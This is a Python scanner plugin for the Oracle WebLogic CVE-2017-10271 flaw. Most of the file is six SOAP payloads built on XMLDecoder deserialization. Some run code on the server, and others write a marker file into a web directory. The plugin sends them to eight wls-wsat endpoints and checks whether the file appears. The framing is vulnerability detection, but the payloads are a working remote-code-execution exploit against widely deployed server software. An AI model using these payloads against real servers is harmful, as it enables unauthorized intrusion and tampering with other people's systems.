Plugins/WebLogic/CVE-2017-10271.py

import requests
from urllib.parse import urlparse
requests.packages.urllib3.disable_warnings()

name = 'Oracle WebLogic Server WLS Security组件安全漏洞(CVE-2017-10271)'

def run(url):
    headers = {
    'Content-Type':'text/xml',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0',
    'h2': 'True',
    'h1': 'True'
    }
    host = urlparse(url)
    url = f"{host.scheme}://{host.netloc}"
    payload1 = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java class="java.beans.XMLDecoder">
            <void class="java.beans.XMLDecoder">
              <new class="java.io.StringBufferInputStream">
                <string>&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;java class="java.beans.XMLDecoder"&gt;&lt;void class="java.lang.Thread" method="currentThread"&gt;&lt;void method="getCurrentWork" id="current_work"&gt;&lt;void method="getClass"&gt;&lt;void method="getDeclaredField"&gt;&lt;string&gt;connectionHandler&lt;/string&gt;&lt;void method="setAccessible"&gt;&lt;boolean&gt;true&lt;/boolean&gt;&lt;/void&gt;&lt;void method="get"&gt;&lt;object idref="current_work"&gt;&lt;/object&gt;&lt;void method="getServletRequest"&gt;&lt;void method="getHeader" id="h1"&gt;&lt;string&gt;h1&lt;/string&gt;&lt;/void&gt;&lt;void method="getHeader" id="h2"&gt;&lt;string&gt;h2&lt;/string&gt;&lt;/void&gt;&lt;void method="getResponse"&gt;&lt;void method="getServletOutputStream"&gt;&lt;void method="writeStream"&gt;&lt;object class="weblogic.xml.util.StringInputStream"&gt;&lt;object idref="h1"&gt;&lt;/object&gt;&lt;/object&gt;&lt;/void&gt;&lt;void method="writeStream"&gt;&lt;object class="weblogic.xml.util.StringInputStream"&gt;&lt;object idref="h2"&gt;&lt;/object&gt;&lt;/object&gt;&lt;/void&gt;&lt;void method="flush"/&gt;&lt;/void&gt;&lt;void method="getWriter"&gt;&lt;void method="write"&gt;&lt;string&gt;&lt;/string&gt;&lt;/void&gt;&lt;/void&gt;&lt;/void&gt;&lt;/void&gt;&lt;/void&gt;&lt;/void&gt;&lt;/void&gt;&lt;/void&gt;&lt;/void&gt;&lt;/java&gt;</string>
              </new>
              <void method="readObject"/>
            </void>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
    '''
    payload2 = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java class="java.beans.XMLDecoder">
            <void class="java.io.PrintWriter">
              <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/_scantest.txt</string>
              <void method="println">
                <string>True</string>
              </void>
              <void method="close"/>
            </void>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
    '''
    payload3 = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java class="java.beans.XMLDecoder">
            <void class="java.beans.XMLDecoder">
              <new class="java.io.StringBufferInputStream">
                <string>&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;java class="java.beans.XMLDecoder"&gt;&lt;void class="java.lang.Thread" method="currentThread"&gt;&lt;void method="getCurrentWork" id="current_work"&gt;&lt;void method="getClass"&gt;&lt;void method="getDeclaredField"&gt;&lt;string&gt;connectionHandler&lt;/string&gt;&lt;void method="setAccessible"&gt;&lt;boolean&gt;true&lt;/boolean&gt;&lt;/void&gt;&lt;void method="get"&gt;&lt;object idref="current_work"&gt;&lt;/object&gt;&lt;void method="getServletRequest"&gt;&lt;void method="getHeader" id="h1"&gt;&lt;string&gt;h1&lt;/string&gt;&lt;/void&gt;&lt;void method="getHeader" id="h2"&gt;&lt;string&gt;h2&lt;/string&gt;&lt;/void&gt;&lt;void method="getResponse"&gt;&lt;void method="getServletOutputStream"&gt;&lt;void method="writeStream"&gt;&lt;object class="weblogic.xml.util.StringInputStream"&gt;&lt;object idref="h1"&gt;&lt;/object&gt;&lt;/object&gt;&lt;/void&gt;&lt;void method="writeStream"&gt;&lt;object class="weblogic.xml.util.StringInputStream"&gt;&lt;object idref="h2"&gt;&lt;/object&gt;&lt;/object&gt;&lt;/void&gt;&lt;void method="flush"/&gt;&lt;/void&gt;&lt;void method="getWriter"&gt;&lt;void method="write"&gt;&lt;string&gt;&lt;/string&gt;&lt;/void&gt;&lt;/void&gt;&lt;/void&gt;&lt;/void&gt;&lt;/void&gt;&lt;/void&gt;&lt;/void&gt;&lt;/void&gt;&lt;/void&gt;&lt;/java&gt;</string>
              </new>
              <void method="readObject"/>
            </void>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
    '''
    payload4 = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java class="java.beans.XMLDecoder">
            <void class="java.io.PrintWriter">
              <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/_scantest.txt</string>
              <void method="println">
                <string>True</string>
              </void>
              <void method="close"/>
            </void>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
    '''
    payload5 = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
      <soapenv:Header>
        <wsa:Action>xx</wsa:Action>
        <wsa:RelatesTo>xx</wsa:RelatesTo>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java class="java.beans.XMLDecoder">
            <void class="java.beans.XMLDecoder">
              <new class="java.io.StringBufferInputStream">
                <string>&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;java class="java.beans.XMLDecoder"&gt;&lt;void class="java.lang.Thread" method="currentThread"&gt;&lt;void method="getCurrentWork" id="current_work"&gt;&lt;void method="getClass"&gt;&lt;void method="getDeclaredField"&gt;&lt;string&gt;connectionHandler&lt;/string&gt;&lt;void method="setAccessible"&gt;&lt;boolean&gt;true&lt;/boolean&gt;&lt;/void&gt;&lt;void method="get"&gt;&lt;object idref="current_work"&gt;&lt;/object&gt;&lt;void method="getServletRequest"&gt;&lt;void method="getHeader" id="h1"&gt;&lt;string&gt;h1&lt;/string&gt;&lt;/void&gt;&lt;void method="getHeader" id="h2"&gt;&lt;string&gt;h2&lt;/string&gt;&lt;/void&gt;&lt;void method="getResponse"&gt;&lt;void method="getServletOutputStream"&gt;&lt;void method="writeStream"&gt;&lt;object class="weblogic.xml.util.StringInputStream"&gt;&lt;object idref="h1"&gt;&lt;/object&gt;&lt;/object&gt;&lt;/void&gt;&lt;void method="writeStream"&gt;&lt;object class="weblogic.xml.util.StringInputStream"&gt;&lt;object idref="h2"&gt;&lt;/object&gt;&lt;/object&gt;&lt;/void&gt;&lt;void method="flush"/&gt;&lt;/void&gt;&lt;void method="getWriter"&gt;&lt;void method="write"&gt;&lt;string&gt;&lt;/string&gt;&lt;/void&gt;&lt;/void&gt;&lt;/void&gt;&lt;/void&gt;&lt;/void&gt;&lt;/void&gt;&lt;/void&gt;&lt;/void&gt;&lt;/void&gt;&lt;/java&gt;</string>
              </new>
              <void method="readObject"/>
            </void>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body>
        <asy:onAsyncDelivery/>
      </soapenv:Body>
    </soapenv:Envelope>
    '''
    payload6 = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
      <soapenv:Header>
        <wsa:Action>xx</wsa:Action>
        <wsa:RelatesTo>xx</wsa:RelatesTo>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java class="java.beans.XMLDecoder">
            <void class="java.io.PrintWriter">
              <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/_scantest.txt</string>
              <void method="println">
                <string>True</string>
              </void>
              <void method="close"/>
            </void>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body>
        <asy:onAsyncDelivery/>
      </soapenv:Body>
    </soapenv:Envelope>
    '''
    for path in ['/wls-wsat/CoordinatorPortType','/wls-wsat/CoordinatorPortType11','/wls-wsat/ParticipantPortType','/wls-wsat/ParticipantPortType11','/wls-wsat/RegistrationPortTypeRPC','/wls-wsat/RegistrationPortTypeRPC11','/wls-wsat/RegistrationRequesterPortType','/wls-wsat/RegistrationRequesterPortType11']:
        vulurl = url + path
        try:
            requests.post(vulurl, headers=headers, data=payload1, timeout=15, verify=False)
            requests.post(vulurl, headers=headers, data=payload2, timeout=15, verify=False)
            requests.post(vulurl, headers=headers, data=payload3, timeout=15, verify=False)
            requests.post(vulurl, headers=headers, data=payload4, timeout=15, verify=False)
            requests.post(vulurl, headers=headers, data=payload5, timeout=15, verify=False)
            requests.post(vulurl, headers=headers, data=payload6, timeout=15, verify=False)
            response = requests.get(f'{url}/bea_wls_internal/_scantest.txt', headers=headers, timeout=15, verify=False)
            if 'True' in response.text:
                return ['True',name,vulurl]
            else:
                return ['False',name]
        except Exception as e:
            return ['False',name]

if __name__ == '__main__':
    url = 'http://192.168.61.128:8109/'
    print(run(url))